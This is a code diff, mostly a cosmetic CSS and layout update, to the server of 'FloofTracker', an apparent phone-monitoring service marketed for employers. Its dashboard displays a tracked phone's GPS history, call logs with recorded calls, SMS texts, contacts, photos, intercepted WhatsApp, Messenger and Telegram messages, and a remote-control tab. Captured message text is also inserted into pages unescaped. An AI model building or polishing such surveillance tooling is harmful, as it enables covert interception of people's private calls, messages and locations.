@@ -150,44 +150,148 @@ function getToken(req) {
 
 const styles = `
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: Arial, sans-serif; background: #f0f2f5; }
-    .header { background: #1a1a2e; color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
-    .header h1 { font-size: 20px; }
-    .container { max-width: 1100px; margin: 30px auto; padding: 0 20px; }
-    .card { background: white; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
-    .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; }
-    .btn-primary { background: #1a1a2e; color: white; }
-    .btn-danger { background: #e74c3c; color: white; }
-    .btn-success { background: #27ae60; color: white; }
-    .btn-sm { padding: 6px 12px; font-size: 12px; }
-    input { width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; margin-bottom: 12px; }
-    .msg { padding: 10px; border-radius: 8px; margin-bottom: 12px; font-size: 13px; }
-    .msg-error { background: #fde; color: #c00; }
-    .msg-success { background: #dfd; color: #060; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #f4f5f8; color: #1f2937; -webkit-font-smoothing: antialiased; }
+    a { color: #1a1a2e; }
+
+    /* Header */
+    .header { background: linear-gradient(120deg, #15152e 0%, #1a1a2e 55%, #26264d 100%); color: #fff; padding: 14px 24px; display: flex; justify-content: space-between; align-items: center; gap: 16px; flex-wrap: wrap; box-shadow: 0 2px 12px rgba(20,20,43,.35); position: sticky; top: 0; z-index: 100; }
+    .header h1 { font-size: 19px; font-weight: 700; letter-spacing: -0.01em; }
+    .header small { color: #9aa3c0; font-size: 12.5px; display: block; margin-top: 3px; }
+    .container { max-width: 1120px; margin: 26px auto; padding: 0 20px; animation: fadeUp .25s ease both; }
+
+    /* Cards */
+    .card { background: #fff; border: 1px solid #e8eaf0; border-radius: 14px; padding: 24px; margin-bottom: 20px; box-shadow: 0 1px 2px rgba(16,24,40,.04), 0 6px 22px rgba(16,24,40,.05); }
+    .card-tight { padding: 0; overflow-x: auto; }
+
+    /* Buttons */
+    .btn { padding: 9px 18px; border: none; border-radius: 10px; cursor: pointer; font-size: 14px; font-weight: 500; font-family: inherit; display: inline-flex; align-items: center; justify-content: center; gap: 6px; transition: background .18s ease, color .18s ease, border-color .18s ease, transform .18s ease, box-shadow .18s ease; }
+    .btn:active { transform: scale(.98); }
+    .btn-primary { background: #1a1a2e; color: #fff; }
+    .btn-primary:hover { background: #27274b; box-shadow: 0 6px 14px rgba(26,26,46,.28); transform: translateY(-1px); }
+    .btn-danger { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
+    .btn-danger:hover { background: #fee2e2; }
+    .btn-success { background: #16a34a; color: #fff; }
+    .btn-success:hover { background: #15803d; box-shadow: 0 6px 14px rgba(22,163,74,.25); transform: translateY(-1px); }
+    .btn-outline { background: #fff; color: #374151; border: 1px solid #e2e4ea; }
+    .btn-outline:hover { background: #f6f7fa; border-color: #c9cdd6; }
+    .btn-sm { padding: 6px 12px; font-size: 12px; border-radius: 8px; }
+
+    /* Inputs */
+    input, select { width: 100%; padding: 10px 14px; border: 1px solid #d4d7df; border-radius: 10px; font-size: 14px; font-family: inherit; background: #fff; color: #1f2937; margin-bottom: 12px; transition: border-color .15s ease, box-shadow .15s ease; }
+    input:focus, select:focus { outline: none; border-color: #1a1a2e; box-shadow: 0 0 0 3px rgba(26,26,46,.12); }
+
+    /* Alerts */
+    .msg { padding: 12px 14px; border-radius: 10px; margin-bottom: 12px; font-size: 13.5px; }
+    .msg-error { background: #fef2f2; color: #b91c1c; border: 1px solid #fecaca; }
+    .msg-success { background: #f0fdf4; color: #15803d; border: 1px solid #bbf7d0; }
+
+    /* Tables */
     table { width: 100%; border-collapse: collapse; }
-    th { background: #1a1a2e; color: white; padding: 10px; text-align: left; font-size: 13px; }
-    td { padding: 8px 10px; border-bottom: 1px solid #eee; font-size: 13px; }
-    tr:hover { background: #f9f9f9; }
-    .token-card { background: #f8f8f8; border-radius: 8px; padding: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
-    .token-code { font-family: monospace; font-size: 12px; color: #555; word-break: break-all; }
-    .badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; }
-    .badge-green { background: #dfd; color: #060; }
-    .badge-gray { background: #eee; color: #666; }
-    img.thumb { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; }
-    .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; }
-    .plan-card { border: 2px solid #ddd; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.2s; }
-    .plan-card:hover { border-color: #1a1a2e; transform: translateY(-2px); }
-    .plan-card h3 { margin-bottom: 8px; }
-    .plan-card .price { font-size: 20px; font-weight: bold; color: #1a1a2e; margin: 8px 0; }
-    .plan-card .devices { color: #666; font-size: 13px; margin-bottom: 12px; }
-    .plan-card.popular { border-color: #1a1a2e; background: #f0f2ff; }
-    .tabs { display: flex; gap: 4px; margin-bottom: 20px; flex-wrap: wrap; }
-    .tab { padding: 10px 18px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; background: #eee; color: #555; transition: all 0.2s; }
-    .tab.active { background: #1a1a2e; color: white; }
+    th { background: #f8f9fc; color: #4b5563; font-weight: 600; font-size: 11.5px; text-transform: uppercase; letter-spacing: .05em; padding: 12px 16px; text-align: left; border-bottom: 1px solid #e8eaf0; white-space: nowrap; }
+    td { padding: 12px 16px; border-bottom: 1px solid #f0f1f5; font-size: 13.5px; vertical-align: middle; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #f6f8ff; }
+    .cell-text { max-width: 400px; overflow-wrap: break-word; }
+
+    /* Tokens page */
+    .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; gap: 12px; flex-wrap: wrap; }
+    .token-card { background: #f8f9fc; border: 1px solid #eceef3; border-radius: 12px; padding: 16px 18px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; gap: 12px; transition: border-color .15s ease, box-shadow .15s ease; }
+    .token-card:hover { border-color: #d4d7df; box-shadow: 0 4px 14px rgba(16,24,40,.06); }
+    .token-code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 12px; color: #6b7280; word-break: break-all; margin-top: 4px; }
+    .badge { padding: 3px 10px; border-radius: 999px; font-size: 11.5px; font-weight: 600; display: inline-block; }
+    .badge-green { background: #dcfce7; color: #15803d; }
+    .badge-gray { background: #f3f4f6; color: #6b7280; }
+    .badge-red { background: #fee2e2; color: #b91c1c; }
+
+    /* Media */
+    img.thumb { width: 76px; height: 76px; object-fit: cover; border-radius: 10px; cursor: pointer; transition: transform .15s ease, box-shadow .15s ease; }
+    img.thumb:hover { transform: scale(1.06); box-shadow: 0 4px 14px rgba(16,24,40,.22); }
+
+    /* Plans */
+    .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(170px, 1fr)); gap: 16px; }
+    .plan-card { border: 1px solid #e2e4ea; border-radius: 14px; padding: 24px 20px; text-align: center; cursor: pointer; transition: all .2s ease; background: #fff; }
+    .plan-card:hover { border-color: #1a1a2e; transform: translateY(-3px); box-shadow: 0 10px 24px rgba(16,24,40,.08); }
+    .plan-card h3 { margin-bottom: 8px; font-size: 16px; }
+    .plan-card .price { font-size: 18px; font-weight: 700; color: #1a1a2e; margin: 8px 0; }
+    .plan-card .devices { color: #6b7280; font-size: 13px; margin-bottom: 14px; }
+    .plan-card.popular { border-color: #1a1a2e; background: linear-gradient(180deg, #f4f5ff, #fff); box-shadow: 0 8px 20px rgba(26,26,46,.12); }
+
+    /* Tabs */
+    .tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+    .tab { padding: 9px 16px; border: 1px solid #e2e4ea; border-radius: 999px; cursor: pointer; font-size: 13.5px; font-weight: 500; background: #fff; color: #4b5563; display: inline-flex; align-items: center; gap: 6px; box-shadow: 0 1px 2px rgba(16,24,40,.04); transition: all .18s ease; font-family: inherit; }
+    .tab:hover { border-color: #1a1a2e; color: #1a1a2e; transform: translateY(-1px); }
+    .tab.active { background: #1a1a2e; color: #fff; border-color: #1a1a2e; box-shadow: 0 4px 12px rgba(26,26,46,.28); }
     .tab-content { display: none; }
-    .tab-content.active { display: block; }
-    .empty { text-align: center; color: #888; padding: 40px; }
-    .no-data { color: #888; text-align: center; padding: 30px; }
+    .tab-content.active { display: block; animation: fadeUp .2s ease both; }
+
+    /* States */
+    .empty { text-align: center; color: #9ca3af; padding: 48px 20px; font-size: 14px; }
+    .no-data { color: #9ca3af; text-align: center; padding: 36px 20px; font-size: 13.5px; }
+
+    /* Device status */
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; }
+    .status-online { background: #22c55e; box-shadow: 0 0 0 3px rgba(34,197,94,.2); }
+    .status-offline { background: #9ca3af; }
+    .status-text-online { color: #86efac; }
+    .status-text-offline { color: #9aa3c0; }
+
+    /* Remote control */
+    .subtext { color: #6b7280; font-size: 13px; margin-bottom: 20px; }
+    .section-title { color: #1f2937; margin-bottom: 14px; font-size: 15px; font-weight: 600; }
+    .remote-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
+    .remote-card { background: #f8f9fc; border: 1px solid #eceef3; border-radius: 14px; padding: 22px 20px; text-align: center; transition: all .18s ease; }
+    .remote-card:hover { border-color: #d4d7df; transform: translateY(-2px); box-shadow: 0 8px 18px rgba(16,24,40,.07); }
+    .remote-icon { font-size: 30px; margin-bottom: 10px; }
+    .remote-card h4 { margin-bottom: 6px; font-size: 15px; }
+    .remote-card p { color: #6b7280; font-size: 12.5px; margin-bottom: 14px; line-height: 1.45; }
+    .result-card { background: #f8f9fc; border: 1px solid #eceef3; border-radius: 14px; padding: 16px; margin-bottom: 14px; }
+    .result-head { display: flex; justify-content: space-between; align-items: center; gap: 12px; margin-bottom: 4px; }
+    .result-label { font-weight: 600; font-size: 14px; }
+    .result-date { color: #9ca3af; font-size: 12px; }
+    .result-card img { max-width: 100%; border-radius: 10px; cursor: pointer; margin-top: 10px; }
+    .result-link { display: inline-block; margin-top: 10px; color: #1a1a2e; font-size: 13px; font-weight: 500; text-decoration: none; }
+    .result-link:hover { text-decoration: underline; }
+    audio { width: 100%; margin-top: 10px; }
+    .audio-mini { height: 34px; width: 210px; margin: 0; }
+    .map-link { color: #1a1a2e; font-weight: 600; text-decoration: none; font-size: 12.5px; background: #eef0ff; padding: 4px 10px; border-radius: 8px; transition: background .15s ease; }
+    .map-link:hover { background: #e0e3ff; }
+
+    /* Messages */
+    .direction-btn.active { background: #1a1a2e; color: #fff; border-color: #1a1a2e; }
+    .app-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 14px; margin-bottom: 20px; }
+    .app-card { border: 1.5px solid #e6e8ef; border-radius: 14px; padding: 22px 16px; text-align: center; cursor: pointer; transition: all .18s ease; background: #fff; }
+    .app-card:hover { border-color: #1a1a2e; transform: translateY(-3px); box-shadow: 0 8px 20px rgba(16,24,40,.08); }
+    .app-icon { font-size: 30px; margin-bottom: 8px; }
+    .app-name { font-weight: 600; font-size: 14.5px; }
+    .app-count { color: #6b7280; font-size: 12.5px; margin-top: 4px; }
+    .back-row { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+    .chat-list { border: 1px solid #eceef3; border-radius: 12px; overflow: hidden; background: #fff; }
+    .chat-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; border-bottom: 1px solid #f0f1f5; cursor: pointer; transition: background .12s ease; }
+    .chat-item:last-child { border-bottom: none; }
+    .chat-item:hover { background: #f6f8ff; }
+    .chat-name { font-weight: 600; font-size: 14px; }
+    .chat-preview { color: #9ca3af; font-size: 12.5px; margin-top: 3px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 420px; }
+    .chat-meta { text-align: right; flex-shrink: 0; margin-left: 12px; }
+    .chat-time { color: #9ca3af; font-size: 11.5px; }
+    .chat-count { background: #1a1a2e; color: #fff; border-radius: 999px; padding: 2px 9px; font-size: 11px; font-weight: 600; margin-top: 5px; display: inline-block; }
+    .msg-thread { max-height: 480px; overflow-y: auto; border: 1px solid #eceef3; border-radius: 12px; background: #fbfcfe; padding: 12px; }
+    .msg-thread::-webkit-scrollbar { width: 8px; }
+    .msg-thread::-webkit-scrollbar-thumb { background: #d4d7df; border-radius: 8px; }
+    .msg-row { display: flex; justify-content: flex-start; margin-bottom: 10px; }
+    .msg-bubble { background: #fff; border: 1px solid #e6e8ef; border-radius: 14px; border-bottom-left-radius: 4px; padding: 9px 14px; max-width: 78%; box-shadow: 0 1px 2px rgba(16,24,40,.05); }
+    .msg-bubble .text { font-size: 14px; line-height: 1.45; }
+    .msg-time { color: #9ca3af; font-size: 11px; margin-top: 6px; text-align: right; }
+    .table-wrap { border: 1px solid #eceef3; border-radius: 12px; overflow: hidden; }
+
+    /* Lightbox */
+    #lightbox { display: none; position: fixed; inset: 0; background: rgba(15,15,30,.92); z-index: 9999; justify-content: center; align-items: center; cursor: pointer; }
+    #lightbox img { max-width: 90%; max-height: 90%; border-radius: 12px; animation: zoomIn .18s ease both; box-shadow: 0 20px 60px rgba(0,0,0,.5); }
+    .lightbox-close { position: fixed; top: 18px; right: 26px; color: #fff; font-size: 32px; font-weight: 300; line-height: 1; cursor: pointer; opacity: .75; transition: opacity .15s ease; z-index: 10000; }
+    .lightbox-close:hover { opacity: 1; }
+
+    /* Animations */
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes zoomIn { from { opacity: 0; transform: scale(.96); } to { opacity: 1; transform: scale(1); } }
 `;
 
 // ── Employer Routes ──────────────────────────────────────────────────────────
@@ -415,12 +519,13 @@ app.post('/device/call-recording', async (req, res) => {
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html><html><head><title>FloofTracker</title><style>
     ${styles}
-    .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
-    .login-box { background:white; border-radius:16px; padding:40px; width:380px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
+    .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+    .login-box { background:white; border:1px solid #e8eaf0; border-radius:16px; padding:40px; width:380px; box-shadow:0 8px 30px rgba(16,24,40,.08); }
     .login-box h2 { margin-bottom:6px; color:#1a1a2e; }
     .login-box p { color:#888; margin-bottom:24px; font-size:14px; }
     .btn { width:100%; padding:12px; font-size:15px; }
-    a { display:block; text-align:center; margin-top:16px; color:#666; font-size:13px; text-decoration:none; }
+    a { display:block; text-align:center; margin-top:16px; color:#6b7280; font-size:13px; text-decoration:none; }
+    a:hover { color:#1a1a2e; }
     </style></head><body>
     <div class="login-wrap">
         <div class="login-box">
@@ -459,12 +564,13 @@ app.get('/', (req, res) => {
 app.get('/register', (req, res) => {
     res.send(`<!DOCTYPE html><html><head><title>Register - FloofTracker</title><style>
     ${styles}
-    .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
-    .login-box { background:white; border-radius:16px; padding:40px; width:380px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
+    .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+    .login-box { background:white; border:1px solid #e8eaf0; border-radius:16px; padding:40px; width:380px; box-shadow:0 8px 30px rgba(16,24,40,.08); }
     .login-box h2 { margin-bottom:6px; color:#1a1a2e; }
     .login-box p { color:#888; margin-bottom:24px; font-size:14px; }
     .btn { width:100%; padding:12px; font-size:15px; }
-    a { display:block; text-align:center; margin-top:16px; color:#666; font-size:13px; text-decoration:none; }
+    a { display:block; text-align:center; margin-top:16px; color:#6b7280; font-size:13px; text-decoration:none; }
+    a:hover { color:#1a1a2e; }
     </style></head><body>
     <div class="login-wrap">
         <div class="login-box">
@@ -506,24 +612,25 @@ app.get('/welcome', (req, res) => {
     res.send(`<!DOCTYPE html><html><head><title>Welcome - FloofTracker</title><style>
     ${styles}
     .feature-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(180px,1fr)); gap:16px; margin:20px 0; }
-    .feature-item { background:#f8f8f8; border-radius:10px; padding:20px; text-align:center; }
+    .feature-item { background:#f8f9fc; border:1px solid #eceef3; border-radius:12px; padding:20px; text-align:center; transition: transform .18s ease, box-shadow .18s ease; }
+    .feature-item:hover { transform: translateY(-2px); box-shadow: 0 8px 18px rgba(16,24,40,.07); }
     .feature-item .icon { font-size:32px; margin-bottom:10px; }
     .feature-item h4 { color:#1a1a2e; margin-bottom:6px; }
-    .feature-item p { color:#888; font-size:13px; }
+    .feature-item p { color:#6b7280; font-size:13px; line-height:1.5; }
     </style></head><body>
     <div class="header"><h1>FloofTracker</h1><button class="btn btn-danger" onclick="logout()">Logout</button></div>
     <div class="container">
         <div class="card" style="text-align:center;padding:40px">
             <h2 style="color:#1a1a2e;margin-bottom:10px">Welcome to FloofTracker </h2>
-            <p style="color:#888;margin-bottom:30px">Here's what you can monitor on your employees' devices</p>
+            <p style="color:#6b7280;margin-bottom:30px">Here's what you can monitor on your employees' devices</p>
             <div class="feature-grid">
-                <div class="feature-item"><div class="icon"></div><h4>GPS Location</h4><p>Real-time location tracking every 5 minutes</p></div>
-                <div class="feature-item"><div class="icon"></div><h4>Call Logs</h4><p>Incoming, outgoing and missed calls with duration</p></div>
-                <div class="feature-item"><div class="icon"></div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
-                <div class="feature-item"><div class="icon"></div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
-                <div class="feature-item"><div class="icon"></div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
-                <div class="feature-item"><div class="icon"></div><h4>Photos & Screenshots</h4><p>Thumbnail previews of all captured media</p></div>
-                <div class="feature-item"><div class="icon"></div><h4>Instant Messages</h4><p>Facebook, Instagram, WhatsApp, Viber and more</p></div>
+                <div class="feature-item"><div class="icon">📍</div><h4>GPS Location</h4><p>Real-time location tracking every 5 minutes</p></div>
+                <div class="feature-item"><div class="icon">📞</div><h4>Call Logs</h4><p>Incoming, outgoing and missed calls with duration</p></div>
+                <div class="feature-item"><div class="icon">💬</div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
+                <div class="feature-item"><div class="icon">📊</div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
+                <div class="feature-item"><div class="icon">👥</div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
+                <div class="feature-item"><div class="icon">🖼️</div><h4>Photos & Screenshots</h4><p>Thumbnail previews of all captured media</p></div>
+                <div class="feature-item"><div class="icon">💌</div><h4>Instant Messages</h4><p>Facebook, Instagram, WhatsApp, Viber and more</p></div>
             </div>
             <button class="btn btn-primary" onclick="window.location.href='/plans'" style="margin-top:30px;padding:14px 40px;font-size:15px">Choose a Plan →</button>
         </div>
@@ -544,7 +651,7 @@ app.get('/plans', (req, res) => {
     <div class="container">
         <div class="card">
             <h2 style="color:#1a1a2e;margin-bottom:6px">Choose Your Plan</h2>
-            <p style="color:#888;margin-bottom:24px">All plans include all features. Upgrade anytime.</p>
+            <p style="color:#6b7280;margin-bottom:24px">All plans include all features. Upgrade anytime.</p>
             <div class="plan-grid">
                 <div class="plan-card" onclick="selectPlan('free')">
                     <h3>Free</h3>
@@ -602,7 +709,7 @@ app.get('/tokens', (req, res) => {
     </style></head><body>
     <div class="header"><h1>FloofTracker</h1>
         <div style="display:flex;gap:8px">
-            <button class="btn btn-primary" onclick="window.location.href='/plans'">Change Plan</button>
+            <button class="btn btn-outline" onclick="window.location.href='/plans'">Change Plan</button>
             <button class="btn btn-danger" onclick="logout()">Logout</button>
         </div>
     </div>
@@ -611,7 +718,7 @@ app.get('/tokens', (req, res) => {
             <div class="top-bar">
                 <div>
                     <h2 style="color:#1a1a2e">Your Devices</h2>
-                    <p style="color:#888;font-size:13px;margin-top:4px">Plan: <b id="plan_label"></b> &nbsp;·&nbsp; <span id="device_count"></span></p>
+                    <p style="color:#6b7280;font-size:13px;margin-top:4px">Plan: <b id="plan_label"></b> &nbsp;·&nbsp; <span id="device_count"></span></p>
                 </div>
                 <button class="btn btn-success" onclick="generateToken()">+ Add Device</button>
             </div>
@@ -653,7 +760,7 @@ app.get('/tokens', (req, res) => {
                         </span>
                     </div>
                     <div style="display:flex;gap:8px;flex-shrink:0">
-                        <button class="btn btn-sm" onclick="copyToken('\${t.token}')" style="background:#eee;color:#333">Copy</button>
+                        <button class="btn btn-sm btn-outline" onclick="copyToken('\${t.token}')">Copy</button>
                         \${t.registered ? \`<button class="btn btn-sm btn-primary" onclick="viewDevice('\${t.token}')">View</button>\` : ''}
                         <button class="btn btn-sm btn-danger" onclick="deleteToken('\${t._id}')">Remove</button>
                     </div>
@@ -709,36 +816,42 @@ app.get('/device', async (req, res) => {
     const media = await Media.find({ token }).sort({ date_taken: -1 });
     const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(200);
 
+    const lastSeenMs = device && device.last_seen ? new Date(device.last_seen).getTime() : 0;
+    const isOnline = (Date.now() - lastSeenMs) < 10 * 60 * 1000;
+
     res.send(`<!DOCTYPE html><html><head>
     <title>${device?.device_model || 'Device'} - FloofTracker</title>
-    <meta http-equiv="refresh" content="30">
+    <meta http-equiv="refresh" content="60">
     <style>${styles}</style>
     </head><body>
     <div class="header">
-        <div>
+        <div style="min-width:0">
             <h1>📱 ${device?.device_model || 'Device'}</h1>
-            <small style="color:#aaa">Android ${device?.android_version || ''} &nbsp;·&nbsp; Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'}</small>
+            <small>Android ${device?.android_version || '—'}
+                · <span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span><span class="${isOnline ? 'status-text-online' : 'status-text-offline'}">${isOnline ? 'Online' : 'Offline'}</span>
+                · Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'}
+            </small>
         </div>
         <div style="display:flex;gap:8px">
-            <button class="btn btn-primary" onclick="window.location.href='/tokens'">← Back</button>
+            <button class="btn btn-outline" onclick="window.location.href='/tokens'">← Back</button>
             <button class="btn btn-danger" onclick="logout()">Logout</button>
         </div>
     </div>
     <div class="container">
         <div class="tabs">
-       <button class="tab active" onclick="showTab('apps', this)"> Apps</button>
-<button class="tab" onclick="showTab('calls', this)"> Calls</button>
-<button class="tab" onclick="showTab('sms', this)"> SMS</button>
-<button class="tab" onclick="showTab('gps', this)"> GPS</button>
-<button class="tab" onclick="showTab('contacts', this)"> Contacts</button>
-<button class="tab" onclick="showTab('media', this)"> Media</button>
-<button class="tab" onclick="showTab('messages', this)"> Messages</button>
-<button class="tab" onclick="showTab('remote', this)"> Remote</button>
+            <button class="tab active" onclick="showTab('apps', this)">📊 Apps</button>
+            <button class="tab" onclick="showTab('calls', this)">📞 Calls</button>
+            <button class="tab" onclick="showTab('sms', this)">💬 SMS</button>
+            <button class="tab" onclick="showTab('gps', this)">📍 GPS</button>
+            <button class="tab" onclick="showTab('contacts', this)">👥 Contacts</button>
+            <button class="tab" onclick="showTab('media', this)">🖼️ Media</button>
+            <button class="tab" onclick="showTab('messages', this)">💌 Messages</button>
+            <button class="tab" onclick="showTab('remote', this)">🎛️ Remote</button>
         </div>
 
         <!-- Apps Tab -->
         <div id="tab-apps" class="tab-content active">
-            <div class="card" style="padding:0">
+            <div class="card card-tight">
                 ${apps.length === 0 ? '<p class="no-data">No app usage data</p>' : `
                 <table>
                     <tr><th>App</th><th>Usage</th><th>Date</th></tr>
@@ -747,43 +860,43 @@ app.get('/device', async (req, res) => {
             </div>
         </div>
 
-       <!-- Calls Tab -->
-<div id="tab-calls" class="tab-content">
-    <div class="card" style="padding:0">
-        ${calls.length === 0 ? '<p class="no-data">No call logs</p>' : `
-        <table>
-            <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th>Recording</th></tr>
-            ${calls.map(c => {
-                // Match recording within 60 seconds of call
-                const recording = recordings.find(r => 
-                    Math.abs(r.recorded_at - c.called_at) < 60000
-                );
-                return `<tr>
-                    <td>${c.number}</td>
-                    <td>${c.contact_name || '-'}</td>
-                    <td>${c.call_type}</td>
-                    <td>${c.duration_seconds}s</td>
-                    <td>${new Date(c.called_at).toLocaleString()}</td>
-                    <td>${recording ? 
-                        `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" style="height:32px;width:200px"></audio>` : 
-                        '<span style="color:#888;font-size:12px">No recording</span>'
-                    }</td>
-                </tr>`;
-            }).join('')}
-        </table>`}
-    </div>
-</div>
+        <!-- Calls Tab -->
+        <div id="tab-calls" class="tab-content">
+            <div class="card card-tight">
+                ${calls.length === 0 ? '<p class="no-data">No call logs</p>' : `
+                <table>
+                    <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th>Recording</th></tr>
+                    ${calls.map(c => {
+                        // Match recording within 60 seconds of call
+                        const recording = recordings.find(r => 
+                            Math.abs(r.recorded_at - c.called_at) < 60000
+                        );
+                        return `<tr>
+                            <td>${c.number}</td>
+                            <td>${c.contact_name || '-'}</td>
+                            <td>${c.call_type}</td>
+                            <td>${c.duration_seconds}s</td>
+                            <td>${new Date(c.called_at).toLocaleString()}</td>
+                            <td>${recording ? 
+                                `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" class="audio-mini"></audio>` : 
+                                '<span style="color:#9ca3af;font-size:12px">No recording</span>'
+                            }</td>
+                        </tr>`;
+                    }).join('')}
+                </table>`}
+            </div>
+        </div>
 
         <!-- SMS Tab -->
         <div id="tab-sms" class="tab-content">
-            <div class="card" style="padding:0">
+            <div class="card card-tight">
                 ${sms.length === 0 ? '<p class="no-data">No SMS messages</p>' : `
                 <table>
                     <tr><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
                     ${sms.map(s => `<tr>
                         <td>${s.number}</td>
                         <td>${s.sms_type}</td>
-                        <td>${s.message_body}</td>
+                        <td class="cell-text">${s.message_body}</td>
                         <td>${new Date(s.received_at).toLocaleString()}</td>
                     </tr>`).join('')}
                 </table>`}
@@ -792,7 +905,7 @@ app.get('/device', async (req, res) => {
 
         <!-- GPS Tab -->
         <div id="tab-gps" class="tab-content">
-            <div class="card" style="padding:0">
+            <div class="card card-tight">
                 ${gps.length === 0 ? '<p class="no-data">No GPS data yet</p>' : `
                 <table>
                     <tr><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
@@ -800,7 +913,7 @@ app.get('/device', async (req, res) => {
                         <td>${g.latitude}</td>
                         <td>${g.longitude}</td>
                         <td>${g.accuracy}m</td>
-                        <td><a href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View</a></td>
+                        <td><a class="map-link" href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View</a></td>
                         <td>${new Date(g.received_at).toLocaleString()}</td>
                     </tr>`).join('')}
                 </table>`}
@@ -809,7 +922,7 @@ app.get('/device', async (req, res) => {
 
         <!-- Contacts Tab -->
         <div id="tab-contacts" class="tab-content">
-            <div class="card" style="padding:0">
+            <div class="card card-tight">
                 ${contacts.length === 0 ? '<p class="no-data">No contacts</p>' : `
                 <table>
                     <tr><th>Name</th><th>Number</th></tr>
@@ -818,142 +931,129 @@ app.get('/device', async (req, res) => {
             </div>
         </div>
 
+        <!-- Media Tab -->
+        <div id="tab-media" class="tab-content">
+            <div class="card card-tight">
+                ${media.length === 0 ? '<p class="no-data">No media files</p>' : `
+                <table>
+                    <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
+                    ${media.map(m => `<tr>
+                        <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : '<span style="color:#9ca3af;font-size:12px">No preview</span>'}</td>
+                        <td>${m.filename}</td>
+                        <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
+                        <td>${Math.round(m.size_bytes / 1024)}KB</td>
+                        <td>${new Date(m.date_taken).toLocaleString()}</td>
+                        <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
+                    </tr>`).join('')}
+                </table>`}
+            </div>
+        </div>
+
+        <!-- Messages Tab -->
+        <div id="tab-messages" class="tab-content">
+            <div class="card">
+                <div style="display:flex;gap:8px;margin-bottom:16px">
+                    <button class="btn btn-outline direction-btn active" onclick="showDirection('incoming')" id="btn-incoming">📥 Incoming</button>
+                    <button class="btn btn-outline direction-btn" onclick="showDirection('outgoing')" id="btn-outgoing">📤 Outgoing</button>
+                </div>
+
+                <!-- Incoming -->
+                <div id="msg-incoming">
+                    <div class="app-grid" id="incoming-apps">
+                        ${['Messenger','WhatsApp','Telegram'].map(function(app) {
+                            const count = notifications.filter(function(n) { return n.app === app && n.direction !== 'outgoing'; }).length;
+                            const icon = app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️';
+                            return '<div class="app-card" onclick="showIncomingChats(&quot;' + app + '&quot;)">'
+                                + '<div class="app-icon">' + icon + '</div>'
+                                + '<div class="app-name">' + app + '</div>'
+                                + '<div class="app-count">' + count + ' messages</div>'
+                                + '</div>';
+                        }).join('')}
+                    </div>
+                    <div id="incoming-chats" style="display:none">
+                        <div class="back-row">
+                            <button class="btn btn-outline" onclick="backFromChats()">← Back</button>
+                        </div>
